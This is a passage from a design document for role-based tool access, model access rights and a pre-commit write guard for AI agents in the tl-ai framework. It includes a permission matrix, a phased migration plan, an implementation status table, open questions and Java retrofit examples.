**Main view - the role x group matrix.** Rows are roles (from `BoundedRole`), columns are tool groups.
Each cell cycles through three states:

```
                     model  data   data   model   agent   agent  inter-  work-
                     .read  .read  .write .struct .author .meta  action  space   script  egress
                     ┌──────┬──────┬──────┬───────┬───────┬──────┬───────┬───────┬───────┬──────┐
 SalesAssistantUser  │  ✓   │  ✓   │  -   │   ✗   │   -   │  ✓   │  ✓ b  │   -   │   ✗   │  -   │
 SalesManager        │  ✓   │  ✓   │  ✓   │   ✗   │   -   │  ✓   │  ✓ b  │   ✓   │   -   │  ✓   │
 ApplicationDeveloper│  ✓   │  ✓   │  ✓   │   ✓ ! │   ✓ ! │  ✓   │  ✓ b  │   ✓   │  ✓ !  │  ✓   │
 Everyone (baseline) │  -   │  -   │  -   │   -   │   -   │  -   │  ✓    │   -   │   -   │  -   │
                     └──────┴──────┴──────┴───────┴───────┴──────┴───────┴───────┴───────┴──────┘
   ✓ granted    - not granted (denied by default)    ✗ explicitly denied
   b from baseline    ! privileged - requires confirmation, logged as a security change
```

**Detail view - per group.** Expanding a column lists its member tools with mode, declared types and
origin (Java factory / MCP server / TL-Script), and allows per-tool `grant`/`deny` overrides for the
rare case where group granularity is too coarse.

**Effective-permissions inspector.** Pick a `Person`, see the resulting tool set with, for each tool,
*which* role granted it. This is the feature that makes the system operable - without it, "why can
Meier not use this?" is unanswerable, exactly the pain #29088 identifies for view-based security
(spec 1.4).

**New-tool review queue.** Tools present in the registry but in no group are listed as "ungrouped -
denied to everyone". A new tool cannot slip into a grant by accident, and the administrator has an
explicit worklist. This is the UI face of O4.

**Guard rails.**
- Granting a privileged group requires a confirmation step and writes a security-change audit record.
- Removing the last grant of `agent.authoring` from all roles warns that no one will be able to
  administer agents.
- The editor **cannot** grant a role something the deployment's `<security-mode>` ceiling forbids; the
  affected cells render disabled with the reason.

**Export.** The matrix exports as the `<tool-access>` XML of section 4.1, so a configuration developed
interactively can be committed to version control - the same round-trip administrators expect from
`<security-config>`.

### 4.4 Defaults for a new tool

1. Tool author sets `group` on `@ToolMethod`. If they forget: ungrouped -> denied to everyone ->
   appears in the review queue.
2. No existing grant reaches a group it does not name, so a tool in a new group needs an administrator
   to add that group deliberately - a **privileged** one above all.
3. If the group is ordinary, roles already granted that group get it. This is the deliberate trade-off
   that makes groups worth having: adding `getInvoiceById` to `data.read` grants it to everyone with
   `data.read`, and the compensating control is L2 - the tool still cannot return an object the user
   may not read.
4. MCP tools arrive at runtime and cannot be annotated. They default to **ungrouped/denied** and must
   be granted through `<tool-groups>` (section 4.1) - explicitly, tool by tool, ideally into `egress`.

---

## 5. Rollout and migration

The hard constraint: **both layers are deny-by-default**, so switching everything on at once turns
every existing agent into an agent that can do nothing. The sequencing below stops data loss first and
defers the changes that need application-side policy authoring.

### Phase 0 - Observability (no behaviour change)

Ship L6 audit and a **dry-run** evaluator: compute the L1 and L4 decisions, log what *would* have been
denied, enforce nothing. This produces the input every application needs to write its policy, and
turns "will this break us?" into a measurement instead of an argument. Also ship the renames of
section 3.7 (`EMPTY` -> `forTesting`, `createUnrestricted` -> `createSystemContext(reason)`): they are
mechanical, they compile-break every bypass call site into visibility, and they change no behaviour.

### Phase 1 - Mode seam, identity, MCP authentication

- Introduce `AiSecurityMode` and resolve it once per run (3.1). Default `LEGACY` for existing
  applications, `ENFORCED` for new ones.
- Refuse `Person`-less runs in `ENFORCED`.
- Require authentication on `/mcp/*` and build a real `ToolContext` for its caller (3.7, issue #261).
  Done so far: the `ToolContext` is real but principal-less, and an `ENFORCED` deployment refuses the
  call rather than running it as the system.

MCP authentication lands here rather than later because it is the only externally reachable
unauthenticated path, and it is independent of any application writing a `<security-config>`.

### Phase 2 - Pre-commit guard · **implemented** - and result filtering

L4 and L3. Deliberately **before** L1/L2 enforcement: these are the layers that stop unauthorized
writes and data leaving, they work without any per-application tool policy, and they are the ones that
still protect an application that never gets round to writing a policy.

**Built:** L4, the pre-commit guard of section 3.5 - `PreCommitGuard`, `ModelSecurityPreCommitGuard`,
`ToolChangeSet` and the call in `AgentLoop.commitTransaction`. It enforces in `ENFORCED` and is a
complete no-op in `LEGACY` and `SYSTEM`: `PreCommitGuard.forRun` hands back `PERMISSIVE`, and the change
set is never even read. The dry-run-in-`LEGACY` variant this section used to propose was dropped - a
`LEGACY` application has no `<security-config>`, so every object would be reported as a violation and
the log would say nothing.

**Still open:** L3, data-tool result filtering, which is absent regardless of mode.

### Phase 3 - Tool RBAC · **implemented, except the administration UI**

`AiToolAccessService`, the group taxonomy and the admin UI. An application enables it by writing
`<tool-access>`. Until it does, the baseline plus per-agent lists apply - i.e. today's behaviour.

**Built:** `AiToolAccessService` reading the section 4.1 XML, with boot-time role validation; all 75
registered tools assigned to the taxonomy through `@ToolMethod(group = ...)`; `hasToolPermission`
enforcing against the roles the run's principal holds; the entry points passing that principal; the
`<background-allowlist>` ceiling; and denials that name the missing capability to both the model and the
log. Administrator-facing documentation is
[tool-access-configuration.md](tool-access-configuration.md).

**Not built:** the administration UI of section 4.3 - no matrix editor, no effective-permissions
inspector, no new-tool review queue. The policy is edited as configuration. Nor is there a per-role
"pre-approved for `data.write`" (open question 6 stays open): approval remains per mode, for every role.

Migration aid: the dry-run evaluator from phase 0 emits a **suggested** `<tool-access>` derived from
observed usage per role. Suggested, never applied - a machine-generated grant is a proposal for a human
to review, not a policy. *Still to build - phase 0 has not shipped.*

### Phase 4 - Model ABAC

L2 in the Java tools, once the application has a `<security-config>`. `getAccessibleTypes` returning
empty for a user is the signal that the application has not yet written one, and produces a targeted
warning rather than a silent empty answer:

> `No model access rights are configured for your roles. The AI assistant cannot access application data until an administrator configures <security-config>.`

### Phase 5 - Remove `LEGACY`

Once applications have migrated, delete `LEGACY` and the dry-run paths. `SYSTEM` remains: audited
system automation is a legitimate need, not a migration crutch.

### What existing applications experience

| Application | Behaviour after phases 0-4 |
|---|---|
| No `<security-config>`, no `<tool-access>` | `LEGACY`: unchanged behaviour, plus a boot warning and audit logs showing what enforcement would deny |
| `<security-config>` present, no `<tool-access>` | `ENFORCED`: model security applies to data; all tools remain available per the agent's own list |
| Both present | Full enforcement |
| Uses `/mcp/*` from an external client | **Keeps working while the deployment is `LEGACY`; refused the moment `<tool-access>` turns enforcement on**, until #261 gives the endpoint an authenticated principal. Deliberate: this is the exposure with the worst blast radius (T7) |
| Uses `aiCallTool` / `aiChat` from TL-Script | Runs as the calling user from phase 1 instead of unrestricted. Scripts relying on the bypass must move to an explicit `createSystemContext(reason)` |

---

## 6. What is built on this branch

tl-ai builds against released engine **`8.0.0-alpha7`**, which contains #29088, so the whole design
compiles against the real API - nothing here is reference code any more. All new types live in
`tl-ai-core/src/main/java/com/top_logic/tl/ai/core/security/`.

| Artifact | Status |
|---|---|
| `AiSecurityMode` - the three modes, `resolve(policy, agentFloor)` and `stricter(...)` | Implemented, unit-tested. The per-agent floor is built (#260): `security-mode` on both agent-definition layers, resolved by the entry points and by `AgentLoop` |
| `ToolGroups` - the built-in group names and the privileged set | Implemented, unit-tested. **Lives in `tl-ai-tool-api`**, not next to the policy: a tool must be able to name its group without depending on the module that enforces it, and `tl-ai-vector-index` (which depends on `tl-ai-tool-api` alone) proved the point |
| `ToolAccessPolicy` - the admin config interface of section 4.1 | Implemented; the XML in 4.1 is what it produces. **Read by `AiToolAccessService`** |
| `AiToolAccessService` - the service of section 4.1 | **Implemented.** Reads the policy, resolves the effective ceiling, validates role names at boot with `context.error(...)`, resolves the roles a principal holds on the security root, and indexes the tool registry for name resolution |
| `RoleToolAccess` - the role-to-tool decision | **Fully implemented and unit-tested** (24 cases: one per row of the 4.1 table, plus name matching and the background allowlist). **Called by `ToolAuthorization`** |
| `ToolAuthorization` - the run-scoped decision | **Implemented and unit-tested.** Binds the policy to the run's principal, held roles and background flag; applies the administrator bypass and the background ceiling; audits denials |
| `ToolIdentity` - how the policy names a tool | **Implemented.** A grant matches the bare tool name, the configured `{factory}.{tool}` name, or the provider-safe `factory__tool` form, so a correctly spelled grant cannot silently miss |
| `ModelSecurity` - the typed façade | Implemented, with `UNCHECKED` as the today-behaviour implementation |
| `ModelAccessRightsSecurity` - the `ModelAccessRights`-backed implementation | **Real and unit-tested** (8 cases against a stub rights service). Replaces what was appendix A |
| `ToolSecurityException` - the denial a tool raises | Implemented; **no tool raises it yet** (that is L2, phase 4) |
| `SecurityContext.securityMode()` / `.modelSecurity()`, `ToolContext.modelSecurity()` | The seam every tool reaches; defaults to `LEGACY` + `UNCHECKED` |
| `SecurityContext.hasToolPermission` + `toolDenialReason` | **Enforcing.** `TopLogicSecurityContext` answers both from the policy; `ToolPermissionFilter` and `AgentLoop` prefer the specific reason over a generic "denied" |
| `TopLogicSecurityContext.forRun(principal, background, agentFloor)` | Resolves the run's mode once as `stricter(ceiling, floor)`, refuses an `ENFORCED` run with no principal, and binds the tool authorization. **Called by the chat, TL-Script and MCP entry points** |
| `SecurityContext.restrictedTo(agentFloor)` / `ToolContext.restrictedTo(...)` | The composition seam. Returns `this` unless the floor really tightens; refuses rather than dropping the floor when the context has no principal to build a stricter one from. **Applied once per run by `AgentLoop`**, which is what gives delegated children and subagents the rule of 3.1 |
| `PreCommitGuard` + `ModelSecurityPreCommitGuard` + `ToolChangeSet` - the L4 guard | **Implemented and wired** (#259). Called once per turn from `AgentLoop.commitTransaction`, only when a transaction is active; reads the change set from the engine's transaction bookkeeping; rolls the turn back through the existing failed-tool-call route. Unit-tested (`TestPreCommitGuard`, `TestAgentLoop`) and end-to-end against the fixture (`SecDemoPreCommitGuardTest`) |
| `@ToolMethod(group = ...)` in `tl-ai-tool-api` | **Enforced.** All 75 registered tools carry a group; `Tool.group()` is the runtime seam |
| `@ToolMethod(types = ...)` | **Removed** (#258). Design in 3.3.3; no code |
| Per-agent `security-mode` (4.2) | **Built** (#260), on both agent-definition layers, unit-tested in `tl-ai-core` and against a booted fixture in `SecDemoAgentFloorTest` |
| Per-agent `required-groups` (4.2) | **Not built.** A self-imposed narrowing of the tool list, independent of the mode above |
| The retrofit example A.1 | Appendix A - illustrative, not applied to any tool. A.2 is no longer an example: it is the shipped shape of the pre-commit guard |

**Behaviour is unchanged until an application writes `<tool-access>`.** The `AiToolAccessService` module
is active by default and resolves to `LEGACY` with an empty policy, which grants every tool and reports
no reason - asserted by `TestTopLogicSecurityContext`. The module is on by default deliberately: a
policy present while the module was off would be silently ignored, which is the one failure mode this
layer must not have. Data-tool result filtering is still absent regardless of mode; the pre-commit guard
is wired and enforcing, subject to the limits section 3.5 states.

One behaviour change does arrive for TL-Script callers, but only under a configured policy:
`aiCallTool` / `aiChat` / `aiAgentChat` now act as the account that ran the script instead of
unrestricted, and `aiCallTool` applies the tool permission check itself, since it dispatches a tool
directly and never passes the agent loop's gate. Without a policy they fall back to the previous
unrestricted context - which preserves more than authorization: an unrestricted context reports
`ExecutionMode.DEVELOPMENT` where a real one reports `PRODUCTION`, and that alone would newly block
`STRUCTURAL` tools.

The one behaviour change that does arrive with `8.0.0-alpha7` is the **engine's own**, not tl-ai's:
TL-Script now applies model access rights (`CreateObject` checks CREATE, attribute reads are
filtered), and those rights deny by default. An application without a `<security-config>` therefore
sees TL-Script creates and reads denied for non-administrators, regardless of `AiSecurityMode`. This
affects `TLScriptTool.executeTLScript` and every script tool. Engine `UpdateSecurityVisitor
.disableSecurity(expr)` is the documented opt-out for internal queries.

See the branch's PR description for the build and test commands that were actually run.

---

## 7. Open questions

1. **Role scope for tool grants.** This design reads roles on the security root (3.2.2). Should a role
   held only on a subtree ever grant a tool? Current answer: no - tool access is a global capability,
   instance nuance is L2's job. Revisit if an application needs "may use the contract tools, but only
   in the contracts module".
2. **Attribute-level filtering in serializers.** L2 supports `canRead(obj, attr)`, but the msgbuf
   serializers used by the tools do not currently have a per-attribute hook. Adding one touches every
   `messages/*.proto`. Worth it, or is object-level filtering enough for v1?
3. **`ChangeSet` extraction cost.** L4 needs the touched attributes per object from the KB transaction.
   The exact API and its cost on large transactions needs measuring before the guard is enabled by
   default.
4. **Per-agent `<security-config>` overlays.** Should an agent be able to *narrow* model access beyond
   the user's own rights (e.g. "this agent may read Customer but never Contract, even for a manager")?
   `required-groups` (4.2) does this at tool granularity; the type-granularity equivalent is unspecified.
5. **Vector-index source ids.** Section 3.4.3 assumes each chunk carries its source object id. Whether
   the current index stores it needs confirming; if not, re-indexing is a prerequisite.
6. **Approval semantics under RBAC.** Today `DATA_WRITE` -> `NeedsApproval` for everyone. Should a role
   be able to carry "pre-approved for `data.write`", turning approval into a per-role property rather
   than a per-mode constant?

---

## Appendix A - retrofit examples

The `ModelAccessRights` binding that used to be reference code in this appendix is now real: see
`ModelAccessRightsSecurity` in `tl-ai-core`, unit-tested by `TestModelAccessRightsSecurity`. What
remains here are the two retrofit examples - illustrative, not applied to any tool yet.

### A.1 Retrofit example: `InstanceBrowserTool.doListInstances`

Filter **before** pagination, and report the filtered count - an unfiltered `totalCount` discloses
cardinality the user may not see.

```java
private InstanceListResponse doListInstances(String moduleName, String typeName,
        Integer limit, String cursor, ToolContext context) {

    TLClass type = MetaElementUtil.getGlobalType(moduleName, typeName);
    // ... validation as today ...

    List<TLObject> allInstances = MetaElementUtil.getAllInstancesOf(type, TLObject.class);

    // NEW: restrict to what the run's principal may read, before paginating, so both the
    // page contents and the reported total reflect the user's view.
    List<TLObject> visible = context.modelSecurity().filterReadable(allInstances);

    int totalCount = visible.size();
    // ... pagination over `visible` exactly as today ...
}
```

### A.2 The pre-commit guard in `AgentLoop.commitTransaction` · **implemented**

The shape the layer of section 3.5 actually has. `PreCommitGuard.forRun` is the one place its mode gate
lives, and it is asked whether it `enforces()` *before* the change set is read, so an unenforcing run
pays nothing.

```java
private void commitTransaction(ToolContext context, Conversation conversation,
        AgentEventListener listener, String runId, int turn) {
    TransactionScope scope = context.transaction();
    if (!scope.isActive()) {
        // No write tool ran this turn: nothing to commit and nothing to guard.
        return;
    }
    if (!preCommitGuardPasses(context, conversation, listener, runId, turn)) {
        return;
    }
    // ... existing commit path ...
}

private boolean preCommitGuardPasses(ToolContext context, Conversation conversation,
        AgentEventListener listener, String runId, int turn) {
    SecurityContext security = context.security();
    PreCommitGuard guard = PreCommitGuard.forRun(security);
    if (!guard.enforces()) {
        return true;
    }
    List<PreCommitGuard.Violation> violations =
        guard.check(security, context.transaction().changes());
    if (violations.isEmpty()) {
        return true;
    }
    rollbackTurn(context, conversation, listener, runId, turn, "Pre-commit security check failed",
        "The data changes of this turn were rolled back and NOT persisted, because your account is"
            + " not permitted to make all of them: " + PreCommitGuard.describe(violations) + " ...");
    return false;
}
```

`rollbackTurn` is the route a failed tool call already took: it rolls the transaction back, emits
`AgentEvent.TransactionRolledBack`, and appends the `[Framework notice]` that corrects the picture the
model was left with. There is deliberately **one** such route - a second one would mean "all-or-nothing"
could come to mean two different things. The per-violation audit record is written by the guard itself,
where the principal is bound, in the same shape as a `ToolAuthorization` denial.
